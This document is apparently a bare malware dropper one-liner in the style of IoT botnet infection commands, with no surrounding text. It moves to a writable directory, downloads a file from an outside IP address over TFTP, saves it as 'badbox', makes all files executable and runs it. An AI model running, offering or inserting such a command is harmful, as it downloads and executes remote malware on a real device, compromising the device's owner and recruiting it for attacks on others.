cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.227.180.165 -c get sgf;cat sgf >badbox;chmod +x *;./badbox
